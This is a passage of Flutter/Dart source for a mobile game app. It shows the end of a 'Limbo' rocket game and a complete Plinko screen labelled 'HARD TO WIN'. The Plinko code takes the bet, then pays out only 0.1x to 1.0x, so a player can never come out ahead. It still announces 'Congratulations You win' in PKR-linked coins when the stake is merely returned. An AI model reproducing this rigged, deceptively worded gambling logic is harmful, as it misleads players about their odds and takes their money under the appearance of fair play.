                style: ElevatedButton.styleFrom(backgroundColor: Colors.orangeAccent, foregroundColor: Colors.black),
                onPressed: isPlaying ? null : _play,
                child: Text(isPlaying ? 'FLYING...' : 'PLAY LIMBO', style: const TextStyle(fontSize: 18, fontWeight: FontWeight.bold)),
              ),
            ),
          ],
        ),
      ),
    );
  }
}

class RocketPathPainter extends CustomPainter {
  final double progress;
  final bool crashed;
  RocketPathPainter({required this.progress, required this.crashed});

  @override
  void paint(Canvas canvas, Size size) {
    final start = Offset(30, size.height - 40);
    final end = Offset(40 + (size.width - 80) * progress, (size.height - 40) - (size.height - 90) * Curves.easeOut.transform(progress));

    final paint = Paint()
      ..color = crashed ? Colors.redAccent : Colors.orangeAccent
      ..strokeWidth = 4
      ..style = PaintingStyle.stroke
      ..strokeCap = StrokeCap.round;

    final path = Path()
      ..moveTo(start.dx, start.dy)
      ..quadraticBezierTo(start.dx + (end.dx - start.dx) * 0.45, size.height * 0.55, end.dx, end.dy);
    canvas.drawPath(path, paint);

    final glow = Paint()
      ..color = (crashed ? Colors.redAccent : Colors.amberAccent).withOpacity(0.3)
      ..strokeWidth = 14
      ..style = PaintingStyle.stroke
      ..maskFilter = const MaskFilter.blur(BlurStyle.normal, 10);
    canvas.drawPath(path, glow);

    final tp = TextPainter(
      text: TextSpan(text: crashed ? '💥' : '🚀', style: const TextStyle(fontSize: 30)),
      textDirection: TextDirection.ltr,
    )..layout();
    tp.paint(canvas, Offset(end.dx - tp.width / 2, end.dy - tp.height / 2));
  }

  @override
  bool shouldRepaint(covariant RocketPathPainter old) => old.progress != progress || old.crashed != crashed;
}

// ==========================================================
// GAME 7: PLINKO (HARD TO WIN)
// ==========================================================
class PlinkoGame extends StatefulWidget {
  final double coins;
  final Function(double) onUpdate;

  const PlinkoGame({super.key, required this.coins, required this.onUpdate});

  @override
  State<PlinkoGame> createState() => _PlinkoGameState();
}

class _PlinkoGameState extends State<PlinkoGame> {
  final Random _rng = Random();
  double betAmount = 100;
  bool isDropping = false;
  String resultMsg = 'Drop the Ball!';

  void dropBall() async {
    if (widget.coins < betAmount) {
      showPubgBanner(context, 'Insufficient Coins!');
      return;
    }
    widget.onUpdate(-betAmount);
    setState(() {
      isDropping = true;
      resultMsg = 'Ball dropping...';
    });

    await Future.delayed(const Duration(seconds: 2));

    List<double> multipliers = [0.1, 0.2, 0.5, 0.5, 1.0, 0.2];
    double mult = multipliers[_rng.nextInt(multipliers.length)];
    double win = betAmount * mult;

    if (!mounted) return;

    if (mult >= 1.0) {
      widget.onUpdate(win);
      showPubgBanner(context, 'Congratulations You win ${win.toStringAsFixed(0)} PKR Coins (1 Coins = 1 PKR)', isWin: true);
    } else {
      showPubgBanner(context, 'Landed on ${mult}x multiplier! Defeat.');
    }

    setState(() {
      isDropping = false;
      resultMsg = 'Landed: ${mult}x';
    });
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: kBg,
      appBar: AppBar(title: const Text('Plinko Game'), backgroundColor: const Color(0xFF101018)),
      body: Container(
        decoration: BoxDecoration(
          image: DecorationImage(image: NetworkImage(bgImageUrl), fit: BoxFit.cover, colorFilter: ColorFilter.mode(Colors.black.withOpacity(0.3), BlendMode.darken)),
        ),
        padding: const EdgeInsets.all(20),
        child: Column(
          children: [
            Expanded(
              child: Center(
                child: Container(
                  padding: const EdgeInsets.all(30),
                  decoration: BoxDecoration(color: kSurface.withOpacity(0.9), borderRadius: BorderRadius.circular(16), border: Border.all(color: Colors.pinkAccent)),
                  child: Column(
                    mainAxisSize: MainAxisSize.min,
                    children: [
                      const Icon(Icons.radio_button_checked, size: 60, color: Colors.pinkAccent),
                      const SizedBox(height: 20),
                      Text(resultMsg, style: const TextStyle(fontSize: 22, fontWeight: FontWeight.bold, color: Colors.white)),
                    ],
                  ),
                ),
              ),
            ),
            BetSelector(currentBet: betAmount, coins: widget.coins, onBetChanged: (amt) => setState(() => betAmount = amt)),
            const SizedBox(height: 20),
            SizedBox(
              width: double.infinity,
              height: 52,
              child: ElevatedButton(
                style: ElevatedButton.styleFrom(backgroundColor: Colors.pinkAccent, foregroundColor: Colors.white),
                onPressed: isDropping ? null : dropBall,
                child: Text(isDropping ? 'DROPPING...' : 'DROP PLINKO BALL', style: const TextStyle(fontSize: 18, fontWeight: FontWeight.bold)),
              ),
            ),
          ],
        ),
      ),
    );
  }
}
